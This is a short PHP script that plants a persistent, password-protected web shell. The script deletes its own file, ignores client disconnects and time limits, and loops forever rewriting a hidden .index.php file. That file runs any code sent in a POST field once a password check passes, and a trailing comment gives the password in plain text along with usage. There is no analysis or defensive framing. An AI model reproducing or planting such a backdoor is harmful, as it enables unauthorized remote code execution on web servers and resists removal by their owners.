<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.index.php';
$code = '<?php
if(md5($_POST["pass"])=="3a50065e1709acc47ba0c9238294364f") {
@eval($_POST[a]);} ?>';
while(1) {
    file_put_contents($file,$code);
    usleep(5000);
}
?>

# ?pass=Sn3rtf4ck&a=command